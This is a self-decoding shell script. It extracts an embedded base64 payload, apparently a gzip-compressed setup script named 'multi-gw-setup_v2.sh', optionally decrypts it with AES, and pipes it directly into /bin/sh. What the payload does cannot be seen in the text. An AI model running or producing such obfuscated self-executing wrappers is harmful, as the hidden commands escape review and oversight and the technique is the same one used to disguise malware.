#!/usr/bin/env sh
# Self-decoding shell script (gzip+base64, optional AES-256-CBC via OpenSSL)
# If encrypted: set OBF_PASSPHRASE env or you will be prompted interactively.

set -eu

need() {
  command -v "$1" >/dev/null 2>&1
}

dec_b64() {
  # Decode base64 from stdin to stdout using available tools
  if need base64; then base64 -d 2>/dev/null || base64 --decode; return; fi
  if need openssl; then openssl base64 -d; return; fi
  if need python3; then python3 - <<'PY'
import sys, base64
sys.stdout.buffer.write(base64.b64decode(sys.stdin.buffer.read()))
PY
  return; fi
  if need python; then python - <<'PY'
import sys, base64
sys.stdout.write(base64.b64decode(sys.stdin.read()))
PY
  return; fi
  if need perl; then perl -MMIME::Base64 -ne 'print decode_base64($_)'; return; fi
  if need busybox; then busybox base64 -d; return; fi
  echo "No base64 decoder found." >&2; exit 1
}

dec_gzip() {
  # Decompress gzip from stdin to stdout
  if need gzip; then gzip -dc; return; fi
  if need busybox; then busybox gzip -dc; return; fi
  # Python fallback using zlib
  if need python3; then python3 - <<'PY'
import sys, zlib
sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read(), 16+zlib.MAX_WBITS))
PY
  return; fi
  if need python; then python - <<'PY'
import sys, zlib
sys.stdout.write(zlib.decompress(sys.stdin.read(), 16+zlib.MAX_WBITS))
PY
  return; fi
  echo "No gzip decompressor found." >&2; exit 1
}

dec_aes() {
  # Decrypt AES-256-CBC with OpenSSL from stdin to stdout using OBF_PASSPHRASE
  if ! need openssl; then
    echo "OpenSSL not available for AES decryption." >&2; exit 1
  fi
  pass="${OBF_PASSPHRASE:-}"
  if [ -z "$pass" ]; then
    printf "Enter passphrase: " >&2
    stty -echo 2>/dev/null || true
    IFS= read -r pass || true
    stty echo 2>/dev/null || true
    echo >&2
  fi
  # pbkdf2 because the obfuscator used it
  OPENSSL_PASS="pass:$pass" exec openssl enc -d -aes-256-cbc -pbkdf2 -pass "$OPENSSL_PASS"
}

# Metadata injected by obfuscator
OBF_ENCRYPTED="0"

# Payload below between markers
PAYLOAD_B64_START="__OBF_B64_PAYLOAD_START__"
PAYLOAD_B64_END="__OBF_B64_PAYLOAD_END__"

# Extract the base64 payload lines
extract_payload() {
  awk "/$PAYLOAD_B64_START/{flag=1;next}/$PAYLOAD_B64_END/{flag=0}flag" "$0"
}

run() {
  if [ "$OBF_ENCRYPTED" = "1" ]; then
    extract_payload | dec_b64 | dec_aes | dec_gzip | /bin/sh -s -- "$@"
  else
    extract_payload | dec_b64 | dec_gzip | /bin/sh -s -- "$@"
  fi
}

run "$@"
exit 0

__OBF_B64_PAYLOAD_START__
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
BXvOLSzEEwAA
__OBF_B64_PAYLOAD_END__
